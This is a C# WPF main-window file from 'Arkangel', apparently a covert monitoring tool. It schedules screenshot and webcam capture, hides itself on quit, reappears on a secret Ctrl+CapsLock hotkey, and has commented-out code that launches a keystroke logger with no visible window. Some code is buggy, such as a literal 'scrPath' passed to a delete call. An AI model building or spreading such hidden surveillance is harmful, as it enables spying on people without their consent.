using System;
using System.Windows;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Windows.Interop;
using System.Diagnostics;

using System.Timers;
using System.Data.SQLite;
using System.IO;

namespace Arkangel
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        [DllImport("user32.dll")]
        private static extern bool RegisterHotKey(IntPtr hWnd, int id, uint fsModifiers, uint vk);

        [DllImport("user32.dll")]

        private static extern bool UnregisterHotKey(IntPtr hWnd, int id);
        private const int HOTKEY_ID = 9000;

        //Modifiers:
        private const uint MOD_NONE = 0x0000; //(none)
        private const uint MOD_ALT = 0x0001; //ALT
        private const uint MOD_CONTROL = 0x0002; //CTRL
        private const uint MOD_SHIFT = 0x0004; //SHIFT
        private const uint MOD_WIN = 0x0008; //WINDOWS
        //CAPS LOCK:
        private const uint VK_CAPITAL = 0x14;
        //Screenshot
        public static System.Timers.Timer aTimer_scrshot = new System.Timers.Timer();
        //Webcam
        public static System.Timers.Timer aTimer_webcam = new System.Timers.Timer();
        // send mail
        public static System.Timers.Timer aTimer_sendMail = new System.Timers.Timer();
      
        public MainWindow()
        {

            InitializeComponent();
           // ProcessStartInfo _startkeylog = startkeylog();
            if (mainPanel.Children.ToString() != "Dashboard")
            {
                Dashboard dashboard = new Dashboard();
                mainPanel.Children.Add(dashboard);
            }


//Closing += new System.ComponentModel.CancelEventHandler(MainWindow_Closing);

            //Keystroke
            //try
            //{
            //    myProcess.StartInfo.UseShellExecute = true;
            //    myProcess.StartInfo.FileName =@"..\..\Module\keystroke.exe";
            //    myProcess.StartInfo.CreateNoWindow = true;
            //    myProcess.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            //    myProcess.Start();
            //}
            //catch { };
            //Screenshot

           
            using (SQLiteConnection connect = new SQLiteConnection(@"Data Source=..\..\database.db"))
            {
                connect.Open();
                using (SQLiteCommand fmd = connect.CreateCommand())
                {
                    //-------------Setting-------------------------//
                    // query
                    string webcamPath = null;
                    string scrPath = null;
                    SQLiteCommand sqlComm_Setting = new SQLiteCommand(@"SELECT * FROM Setting,current_user WHERE Setting.id = current_user.id", connect);
                    SQLiteDataReader st = sqlComm_Setting.ExecuteReader();
                    while(st.Read())
                    {
                        webcamPath = Path.GetFullPath(st["webcamLog"].ToString());
                        scrPath = Path.GetFullPath(st["screenshotLog"].ToString());

                        //Console.WriteLine("webcam path: " + webcamPath);
                        //Console.WriteLine("screenshot path: "+ scrPath);
                        
                    }


                    //----------- Screenshot -----------------//
                    // query to get values of screenshot table
                    int Screenshot_hours = 0, Screenshot_minutes = 0, Screenshot_enable = 0;
                    SQLiteCommand sqlComm_Screenshot = new SQLiteCommand(@"SELECT * FROM Screenshot,current_user WHERE Screenshot.id = current_user.id", connect);
                    SQLiteDataReader data = sqlComm_Screenshot.ExecuteReader();
                    while (data.Read())
                    {

                        int.TryParse(data["enable"].ToString(), out Screenshot_enable);
                        int.TryParse(data["hours"].ToString(), out Screenshot_hours);
                        int.TryParse(data["minutes"].ToString(), out Screenshot_minutes);

                        DateTime temp = DateTime.Parse(data["datetime"].ToString());
                        double days = Double.Parse(data["daysDel"].ToString());

                        if (temp.AddDays(days).CompareTo(DateTime.Now) >= 0)
                        {

                            if (Directory.Exists(scrPath))
                            {
                                Directory.Delete("scrPath", true);
                                Console.WriteLine("Delete scr log successful!");
                            }
                        }
                    }
                    // start timer screenshot if enable
                    if (Screenshot_enable == 1)
                    {
                        Functions.SetTimerScreenShot(Screenshot_hours * 60 * 60 * 1000 + Screenshot_minutes * 60 * 1000);
                        aTimer_scrshot.Start();
                    }

                    //----------------------------------//
                    //------------Webcam----------------//
                    int Webcam_enable = 0, Webcam_hours = 0, Webcam_minutes = 0;
                    SQLiteCommand sqlConn_Webcam = new SQLiteCommand(@"SELECT * FROM Webcam,current_user WHERE Webcam.id = current_user.id", connect);
                    SQLiteDataReader wc = sqlConn_Webcam.ExecuteReader();
                    while (wc.Read())
                    {
                        int.TryParse(wc["enable"].ToString(), out Webcam_enable);
                        int.TryParse(wc["hours"].ToString(), out Webcam_hours);
                        int.TryParse(wc["minutes"].ToString(), out Webcam_minutes);

                        /// calculate time and dele folder webcam
                        //DateTime temp = DateTime.nu;
                        // if (wc["datetime"].ToString() != null)
                        DateTime temp = DateTime.Parse(wc["datetime"].ToString());
                        double days = Double.Parse(wc["days"].ToString());

                        if (temp.AddDays(days).CompareTo(DateTime.Now) >= 0)
                        {
                            if (Directory.Exists(webcamPath))
                            {
                                Directory.Delete(webcamPath, true);
                                Console.WriteLine("Delete webcam logs successful!");
                            }
                        }
                    }
                    // Start timer for webcam
                    if (Webcam_enable == 1)
                    {
                        Functions.SetTimerWebcam(Webcam_hours * 60 * 60 * 1000 + Webcam_minutes * 60 * 1000);
                        aTimer_webcam.Start();
                    }
                    //----------------------------------------//

                }

                connect.Close();
            }


            //Mail


            //FTP

          //  Closing += new System.ComponentModel.CancelEventHandler(windowl);


        }
        private IntPtr _windowHandle;
        private HwndSource _source;
        protected override void OnSourceInitialized(EventArgs e)
        {
            base.OnSourceInitialized(e);
            _windowHandle = new WindowInteropHelper(this).Handle;
            _source = HwndSource.FromHwnd(_windowHandle);
            _source.AddHook(HwndHook);

            RegisterHotKey(_windowHandle, HOTKEY_ID, MOD_CONTROL,VK_CAPITAL); //CTRL + CAPS_LOCK
        }

        private IntPtr HwndHook(IntPtr hwnd, int msg, IntPtr wParam, IntPtr lParam, ref bool handled)
        {
            const int WM_HOTKEY = 0x0312;
            switch (msg)
            {
                case WM_HOTKEY:
                    switch (wParam.ToInt32())
                    {
                        case HOTKEY_ID:
                            int vkey = (((int)lParam >> 16) & 0xFFFF);
                            if (vkey == VK_CAPITAL)
                            {
                                this.Show();
                            }
                            handled = true;
                            break;
                    }
                    break;
            }
            return IntPtr.Zero;
        }

        private void Button_OpenMenu_Click(object sender, RoutedEventArgs e)
        {
            CloseMenu.Visibility = Visibility.Visible;
            OpenMenu.Visibility = Visibility.Collapsed;
            allIcon.Visibility = Visibility.Visible;
            lb_title.Visibility = Visibility.Visible;
        }

        private void Button_CloseMenu_Click(object sender, RoutedEventArgs e)
        {
            CloseMenu.Visibility = Visibility.Collapsed;
            OpenMenu.Visibility = Visibility.Visible;
            allIcon.Visibility = Visibility.Hidden;
            lb_title.Visibility = Visibility.Collapsed;
        }

        private void bt_home_Click(object sender, RoutedEventArgs e)
        {
            mainPanel.Children.Clear();
            Dashboard dashboard = new Dashboard();
            mainPanel.Children.Add(dashboard);
        }
        private void bt_logout_Click_1(object sender, RoutedEventArgs e)
        {
            if (System.Windows.Forms.MessageBox.Show("Do you want to log out", "Warning", MessageBoxButtons.YesNo) == System.Windows.Forms.DialogResult.Yes)
            {
                //ProcessStartInfo _process = startkeylog();
                //foreach (var process in Process.GetProcessesByName("keystroke.exe"))
                //{
                //    process.Kill();
                //}
               
                try
                {
                    myProcess.Kill();
                    myProcess.Dispose();
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.ToString());
                }
                LoginForm loginForm = new LoginForm();
                loginForm.Show();
                Close();
            }
           
        }

        private void bt_Quit_Click(object sender, RoutedEventArgs e)
        {
            Hide();
        }

        private Process myProcess = new Process();

        //private void Grid_Loaded(object sender, RoutedEventArgs e)
        //{
        //    //try
        //    //{
        //    //    myProcess.StartInfo.UseShellExecute = true;
        //    //    myProcess.StartInfo.FileName = "..\\..\\Module_py\\webcam.py";
        //    //    myProcess.StartInfo.CreateNoWindow = true;
        //    //    myProcess.Start();
        //    //}
        //    //catch (Exception ex)
        //    //{
        //    //    Console.WriteLine("MESSAGE: " + ex.Message);
        //    //}
        //}
        //private void MainWindow_Closing(object sender, System.ComponentModel.CancelEventArgs e)
        //{
        //    try
        //    {
        //        myProcess.Kill();
        //        myProcess.Dispose();
        //    }
        //    catch (Exception ex)
        //    {
        //        Console.WriteLine(ex.ToString());
        //    }
        //}

        private void bt_Setting_Click(object sender, RoutedEventArgs e)
        {
            Setting setting = new Setting();
            setting.Show();
        }

        private void bt_qGeneral_Click(object sender, RoutedEventArgs e)
        {
            General general = new General();
            mainPanel.Children.Clear();
            mainPanel.Children.Add(general);
        }

        private void bt_qClipboard_Click(object sender, RoutedEventArgs e)
        {
            _Clipboard general = new _Clipboard();
            mainPanel.Children.Clear();
            mainPanel.Children.Add(general);
        }

        private void bt_qFTP_Click(object sender, RoutedEventArgs e)
        {
            FTP general = new FTP();
            mainPanel.Children.Clear();
            mainPanel.Children.Add(general);
        }

        private void bt_qWebcam_Click(object sender, RoutedEventArgs e)
        {
            Webcam webcam = new Webcam();
            mainPanel.Children.Clear();
            mainPanel.Children.Add(webcam);
        }

        private void bt_qTarget_Click(object sender, RoutedEventArgs e)
        {
            Target target = new Target();
            mainPanel.Children.Clear();
            mainPanel.Children.Add(target);
        }

        private void bt_qUser_Click(object sender, RoutedEventArgs e)
        {
            User user = new User();
            mainPanel.Children.Clear();
            mainPanel.Children.Add(user);
        }

        private void bt_qWU_Click(object sender, RoutedEventArgs e)
        {
            Website_Usage website_Usage = new Website_Usage();
            mainPanel.Children.Clear();
            mainPanel.Children.Add(website_Usage);
        }

        private void bt_qScrshot_Click(object sender, RoutedEventArgs e)
        {
            Screenshot screenshot = new Screenshot();
            mainPanel.Children.Clear();
            mainPanel.Children.Add(screenshot);
        }

        private void bt_qMail_Click(object sender, RoutedEventArgs e)
        {
            Email email = new Email();
            mainPanel.Children.Clear();
            mainPanel.Children.Add(email);
        }

        private void bt_qAlert_Click(object sender, RoutedEventArgs e)
        {
            Alert alert = new Alert();
            mainPanel.Children.Clear();
            mainPanel.Children.Add(alert);
        }

        private void StackPanel_MouseDown(object sender, System.Windows.Input.MouseButtonEventArgs e)
        {
            DragMove();
        }

    }
}

